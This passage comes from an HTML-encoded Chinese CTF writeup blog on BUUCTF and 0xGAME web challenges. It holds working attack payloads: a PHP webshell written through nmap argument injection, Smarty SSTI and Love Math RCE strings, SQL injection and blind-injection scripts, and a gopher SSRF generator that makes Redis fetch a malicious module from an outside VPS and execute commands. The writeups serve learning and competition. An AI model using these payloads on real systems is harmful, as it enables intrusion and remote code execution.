class="hljs-number">95</span>%<span class="hljs-number">18</span>%af%bf%a2%<span class="hljs-number">00</span>%a8%<span class="hljs-number">28</span>%<span class="hljs-number">4</span>b%f3%<span class="hljs-number">6</span>e%<span class="hljs-number">8</span>e%<span class="hljs-number">4</span>b%<span class="hljs-number">55</span>%b3%<span class="hljs-number">5</span>f%<span class="hljs-number">42</span>%<span class="hljs-number">75</span>%<span class="hljs-number">93</span>%d8%<span class="hljs-number">49</span>%<span class="hljs-number">67</span>%<span class="hljs-number">6</span>d%a0%d1%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%<span class="hljs-number">83</span>%<span class="hljs-number">60</span>%fb%<span class="hljs-number">5</span>f%<span class="hljs-number">07</span>%fe%a2<span class="hljs-comment">//a</span><br><br>%<span class="hljs-number">4</span>d%c9%<span class="hljs-number">68</span>%ff%<span class="hljs-number">0</span>e%e3%<span class="hljs-number">5</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">95</span>%<span class="hljs-number">72</span>%d4%<span class="hljs-number">77</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">72</span>%<span class="hljs-number">15</span>%<span class="hljs-number">87</span>%d3%<span class="hljs-number">6</span>f%a7%b2%<span class="hljs-number">1</span>b%dc%<span class="hljs-number">56</span>%b7%<span class="hljs-number">4</span>a%<span class="hljs-number">3</span>d%c0%<span class="hljs-number">78</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">7</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">18</span>%af%bf%a2%<span class="hljs-number">02</span>%a8%<span class="hljs-number">28</span>%<span class="hljs-number">4</span>b%f3%<span class="hljs-number">6</span>e%<span class="hljs-number">8</span>e%<span class="hljs-number">4</span>b%<span class="hljs-number">55</span>%b3%<span class="hljs-number">5</span>f%<span class="hljs-number">42</span>%<span class="hljs-number">75</span>%<span class="hljs-number">93</span>%d8%<span class="hljs-number">49</span>%<span class="hljs-number">67</span>%<span class="hljs-number">6</span>d%a0%d1%d5%<span class="hljs-number">5</span>d%<span class="hljs-number">83</span>%<span class="hljs-number">60</span>%fb%<span class="hljs-number">5</span>f%<span class="hljs-number">07</span>%fe%a2<span class="hljs-comment">//b</span><br></code></pre></td></tr></table></figure><p>cmd&#x3D;ca\t%20&#x2F;f\l\a\g，试了一下反斜杠，确实是匹配不到（奇怪</p><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">class Show __wakeup(): preg_match...  =&gt;  $this-&gt;source = class Show() __toString() <br>class Show __toString(): $this-&gt;str-&gt;source  =&gt; $this-&gt;str = class Test __get($key)<br>class Test __get(): $function()  =&gt;  $this-&gt;p = class Modifier __invoke()<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Show&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;source&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Show&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;source&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;index.php&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;str&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;Modifier&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;%00*%00var&quot;</span>;s:<span class="hljs-number">57</span>:<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;&#125;&#125;&#125;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;str&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure><h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>查漏补缺一下XXE</p><p>XXE：XML External Entity 即<strong>XML外部实体注入攻击</strong>。是由于程序在解析输入的XML数据时，解析了攻击者伪造的<strong>外部实体</strong>，通过<strong>外部实体SYSTEM</strong>请求本地文件uri，通过某种方式返回本地的文件内容，导致了XXE漏洞。漏洞形成的标志性函数：例如<strong>PHP</strong>中的<code>simplexml_load_string</code>或者<code>simplexml_load_file</code>，默认情况下都会解析外部实体。</p><p>不得不了解的是DTD</p><p>DTD：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。</p><p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></code></pre></td></tr></table></figure><p>本题有<code>simplexml_load_string</code>，但是如果直接访问result?f&#x3D;&lt;xml&gt;…是不行的，一开始扫的输入疑似也有waf</p><p>绕waf倒是简单，估计就是访问了之后转换成xml然后显示（？，个人认为是打一个xxe</p><p>得，看题解结果还真是nmap命令，nmap $Input -oX .&#x2F;xml&#x2F;random，那直接给input带参数传马就行了</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?=</span> <span class="hljs-variable">@eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);<span class="hljs-string">?&gt;</span> -oG a.phtml<br></code></pre></td></tr></table></figure><p>不行？！结果是还用了escapeshellarg()和escapeshellcmd()，不是哥们，你这黑盒谁看得出来？？？</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?=</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG a.phtml &#x27;</span><br></code></pre></td></tr></table></figure><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>此题本以为是一道再简单不过的php反序列化，结果正常打不通，那应该想到disable_functions了</p><p>倒是有意思，能知道很多exploitable functions，像是这题就可以用assert，此题ban掉的函数如下</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,<span class="hljs-keyword">system</span>,<span class="hljs-keyword">exec</span>,shell_exec,popen,proc_open,passthru,<span class="hljs-keyword">symlink</span>,<span class="hljs-keyword">link</span>,syslog,imap_open,ld,mail,scadnir,readfile,show_source,fpassthru,<span class="hljs-keyword">readdir</span><br></code></pre></td></tr></table></figure><p>基本都是写读文件或者执行系统命令的函数或者定时任务，这个pcntl占了一大坨，我不禁想这到底是手动加的还是默认就ban的？？后来我找到了pcntl被禁用的原因是防止它对web服务的稳定性造成影响，即便它可能不能执行什么系统命令</p><h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>EZ的SSTI，php的smarty</p><p><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#smarty-php">PHP_smarty</a></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">&#123;<span class="hljs-symbol">$</span>smarty.version&#125;<br>&#123;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)&#125; <span class="hljs-comment">// compatible v3</span><br></code></pre></td></tr></table></figure><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>本来以为是XSS，admin懒得爆破了就去搜题解，结果是sql注入，不过还是蛮有意思的，对关键词有waf</p><p>只能说mysql的方言好多啊，大概过滤了这么些</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">空格被替换为空<br>or<br>and<br><span class="hljs-section">join</span><br><span class="hljs-section">--+</span><br>#<br>updatexml<br>extractvalue<br>exp<br>floor<br>...<br></code></pre></td></tr></table></figure><p>尝试联合查询，先判断有多少字段，order by不能使用，可以用group by</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">title</span>=<span class="hljs-string">&#x27;group/**/by/**/23,&#x27;</span><span class="hljs-variable">&amp;content</span>=123<span class="hljs-variable">&amp;ac</span>=<span class="hljs-keyword">add</span><br></code></pre></td></tr></table></figure><p>发现有22个字段的样子，直接联合查询，回显在2和3</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">title</span>=&#x27;union/**/select/**/<span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,&#x27;<span class="hljs-number">22</span>&amp;content=<span class="hljs-number">123</span>&amp;ac=add<br></code></pre></td></tr></table></figure><p>得到数据库名web1</p><p>因为过滤了or，所以也不能用information_schema表，但是可以用mysql.innodb_tables_stats，用group_concat拼接所有表名，一次性看</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">title</span>=&#x27;union/**/select/**/<span class="hljs-number">1</span>,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,&#x27;<span class="hljs-number">22</span>&amp;content=<span class="hljs-number">123</span>&amp;ac=add<br></code></pre></td></tr></table></figure><p>没有字段信息可以查，使用<del>无列名注入</del>直接查内容（原话搬自别人的wp</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">title</span>=&#x27;union/**/select/**/<span class="hljs-number">1</span>,(select/**/group_concat(`<span class="hljs-number">3</span>`)/**/from/**/(select/**/<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>/**/union/**/select/**/*/**/from/**/users)a),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,&#x27;<span class="hljs-number">22</span>&amp;content=<span class="hljs-number">123</span>&amp;ac=add<br></code></pre></td></tr></table></figure><h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>唉盲注，唉脚本，唉fuzz</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url1=<span class="hljs-string">&quot;http://ac3ceffb-5fec-49c1-9028-86b4555f01be.node5.buuoj.cn:81/search.php?id=1^(ord(substr((select(group_concat(password))from(`F1naI1y`)),&quot;</span><br>url2=<span class="hljs-string">&quot;,1))=&quot;</span><br>name=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">150</span>,<span class="hljs-number">225</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>,<span class="hljs-number">125</span>):<br>        target = url1 + <span class="hljs-built_in">str</span>(i) + url2 + <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&quot;)&quot;</span><br>        s = requests.get(target).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ERROR&quot;</span> <span class="hljs-keyword">in</span> s:<br>            name = name + <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(name)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><p>经典ciscn出的php晦涩rce，只能说和2024的有异曲同工之妙，只不过2024的Simple_php着实是揣着答辩装糊涂</p><p>这题最关键的就是用数学函数能搞出一个rce的式子，那说到字母和数字rce肯定逃不过的就是hex2bin，所以我们首先要构造一个hex2bin出来，注意到很有意思的一个函数是base_convert()，那么很显然我们可以用数字转成36进制（要有26个英文字母比较好整）中的hex2bin</p><p>有了hex2bin，其实可以干的事情就很多了，比如造system，但是这里好像编码有点问题，所以可以用_GET打一个webshell</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua">base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>) =&gt; <span class="hljs-string">&quot;hex2bin&quot;</span><br>dechex(<span class="hljs-number">1598506324</span>) =&gt; <span class="hljs-string">&quot;5f474554&quot;</span><br>$<span class="hljs-built_in">pi</span>=hex2bin(<span class="hljs-string">&quot;5f474554&quot;</span>) =&gt; $<span class="hljs-built_in">pi</span>=<span class="hljs-string">&quot;_GET&quot;</span>   //hex2bin将一串<span class="hljs-number">16</span>进制数转换为二进制字符串<br>($$<span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">pi</span>&#125;(($$<span class="hljs-built_in">pi</span>)&#123;<span class="hljs-built_in">abs</span>&#125;) =&gt; ($_GET)&#123;<span class="hljs-built_in">pi</span>&#125;($_GET)&#123;<span class="hljs-built_in">abs</span>&#125;  //&#123;&#125;可以代替[]<br></code></pre></td></tr></table></figure><p>payload：?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi&#x3D;system&amp;abs&#x3D;tac &#x2F;flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0xgame2023 Writeup</title>
    <link href="/2023/12/07/0xGAME/"/>
    <url>/2023/12/07/0xGAME/</url>
    
    <content type="html"><![CDATA[<h2 id="0xGAME"><a href="#0xGAME" class="headerlink" title="0xGAME"></a>0xGAME</h2><h3 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h3><h4 id="web-snapshot"><a href="#web-snapshot" class="headerlink" title="web_snapshot"></a>web_snapshot</h4><p>好题目，学习一下</p><p>首先传入的URL有<code>http:// or https://</code>的正则匹配，所以一般来说伪协议<code>file://, gopher://</code>都不能直接传入，那么似乎就没办法很愉快的ssrf了，然而这个时候就得回去仔细看看源码是不是有遗漏的东西</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) </span>&#123;<br><span class="hljs-number">2</span>     <span class="hljs-variable">$curl</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><span class="hljs-number">3</span>     <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br><span class="hljs-number">4</span>     <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-number">5</span>     <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-number">6</span>     <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_FOLLOWLOCATION, <span class="hljs-literal">true</span>);<br><span class="hljs-number">7</span>     <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curl</span>);<br><span class="hljs-number">8</span>     <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curl</span>);<br><span class="hljs-number">9</span>     <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br><span class="hljs-number">10</span> &#125;<br></code></pre></td></tr></table></figure><p>可以看到<code>curl</code>这个老熟人是我们感兴趣的，注意第5行，设置了<code>CURLOPT_FOLLOWLOCATION</code>为True</p><p>查Manual可知，这是容许<code>curl</code>请求URL的时候进行重定向的方法，那么重定向就可以使用伪协议，接着PoC一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: http://www.baidu.com&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在vps执行<code>php -S 0.0.0.0:52000</code>，等于是用php起一个http-server</p><p>上面这个实例直接用http访问就可以发现重定向到了百度，所以用<code>header</code>是可以修改响应头的</p><p>疑似得加<code>?&gt;</code>不然重定向就会失败，接下来试一下伪协议的读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: file:///Jex/server/1.txt&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>不知道为什么用<code>curl_exec</code>读不了，不重定向的话是可以读的，重定向就读不出来了（（</p><p>用http访问的话还是能看到响应头Location变成<code>file:///Jex/server/1.txt</code>的，状态码也是302</p><p>先放一边，只是读不到特定的数据但是访问状态码还是302</p><p>接着就是ssrf+redis主从复制组合拳的内容了，看writeup都踩了不少坑，是我理解能力问题了</p><blockquote><p><a href="https://www.cnblogs.com/xiaozi/p/13089906.html">Redis主从复制getshell技巧</a></p><p><a href="https://inhann.top/2021/09/14/redis_master_slave_rce/">redis 主从复制 RCE</a></p></blockquote><p>实际上redis主从复制的原理就是主从之间数据的同步，一般是通过命令将靶机作为攻击机的<code>slave</code></p><p>获取其中的数据或者写入恶意<code>.so</code>文件（攻击机上有<code>.so</code>）并加载模块实现RCE，这里贴几个exp</p><blockquote><p><a href="https://github.com/Dliv3/redis-rogue-server">Redis Rogue Server</a> :redis-rogue-server.py</p><p><a href="https://github.com/vulhub/redis-rogue-getshell">Redis Rogue Server</a> :redis-master.py</p></blockquote><p>首先判断我们没办法直接连接redis然后再客户端进行操作，所以需要根据可传入的信息进行SSRF</p><p>那么可以传入的也就只有<code>curl</code>的URL了，仅有的http协议没有什么作用，所以需要用伪协议扩大攻击面</p><p>正好可以通过<code>gopher://或者dict://</code>伪协议进行redis主从复制RCE，所以用这个办法打redis</p><p>首先我们要明确<code>gopher://</code>可以发送HTTP数据包，那么就可以利用<code>gopher://</code>来向redis进行通信</p><p>但是得注意<code>gopher://</code>有几个小坑，接下来我会一一列举一下，具体可参考</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/112055947">Gopher协议在SSRF漏洞中的深入研究</a></p></blockquote><ul><li>必须固定格式<code>gopher://url/_\&lt;payload&gt;</code>，gopher会忽略接收到url后的第一个字符，所以要用下划线占位</li><li>问号（？）需要转码为URL编码，也就是%3f</li><li>回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a</li><li>在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束</li></ul><p>那么该如何利用<code>gopher://</code>呢？首先我们要对redis会把传给它的HTTP数据包每一行都当做命令来执行，详见</p><blockquote><p><a href="https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html">Trying to hack Redis via HTTP requests</a></p></blockquote><p>由此我们便能通过<code>gopher://</code>来控制redis跑我们想要它执行的命令（例如<code>slaveof</code>），那么接下来就讲一下过程</p><h5 id="Make-use-of-it"><a href="#Make-use-of-it" class="headerlink" title="Make use of it"></a>Make use of it</h5><p>首先生成一下跑命令用的payload，套用X1r0z的脚本跑一下，修改一下某些参数，这里贴一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment">#URL编码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">urlencode</span>(<span class="hljs-params">data</span>):<br>    enc_data = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        h = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(h) == <span class="hljs-number">1</span>:<br>            enc_data += <span class="hljs-string">&#x27;%0&#x27;</span> + h.upper()<br>        <span class="hljs-keyword">else</span>:<br>            enc_data += <span class="hljs-string">&#x27;%&#x27;</span> + h.upper()<br>    <span class="hljs-keyword">return</span> enc_data<br><br><span class="hljs-comment">#gopher_payload生成</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_payload</span>(<span class="hljs-params">payload</span>):<br><br>    redis_payload = <span class="hljs-string">&#x27;&#x27;</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload.split(<span class="hljs-string">&#x27;\n&#x27;</span>):<br>        arg_num = <span class="hljs-string">&#x27;*&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(i.split(<span class="hljs-string">&#x27; &#x27;</span>)))<br>        redis_payload += arg_num + <span class="hljs-string">&#x27;\r\n&#x27;</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i.split(<span class="hljs-string">&#x27; &#x27;</span>):<br>            arg_len = <span class="hljs-string">&#x27;$&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(j))<br>            redis_payload += arg_len + <span class="hljs-string">&#x27;\r\n&#x27;</span><br>            redis_payload += j + <span class="hljs-string">&#x27;\r\n&#x27;</span><br><br>    gopher_payload = <span class="hljs-string">&#x27;gopher://db:6379/_&#x27;</span> + urlencode(redis_payload)<br>    <span class="hljs-keyword">return</span> gopher_payload<br><br><span class="hljs-comment">#主从复制</span><br>payload1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">slaveof 8.140.253.18 51997</span><br><span class="hljs-string">config set dir /tmp</span><br><span class="hljs-string">config set dbfilename exp.so</span><br><span class="hljs-string">quit</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment">#执行RCE</span><br>payload2 = <span class="hljs-string">&#x27;&#x27;&#x27;slaveof no one</span><br><span class="hljs-string">module load /tmp/exp.so</span><br><span class="hljs-string">system.exec &#x27;env&#x27;</span><br><span class="hljs-string">quit</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(gen_payload(payload1))<br><span class="hljs-built_in">print</span>(gen_payload(payload2))<br></code></pre></td></tr></table></figure><p>以后碰到SSRF+redis主从复制也可以套用的（等着什么时候做个汇总</p><p>拿到payload以后，由于需要让<code>curl</code>通过<code>http重定向到gopher</code>，所以在vps上开个php服务，记得端口不要和payload的端口一致，待会还要用<code>redis-rogue-server.py</code>监听payload端口的</p><p>先写php文件实现重定向，然后shell上开服务</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: 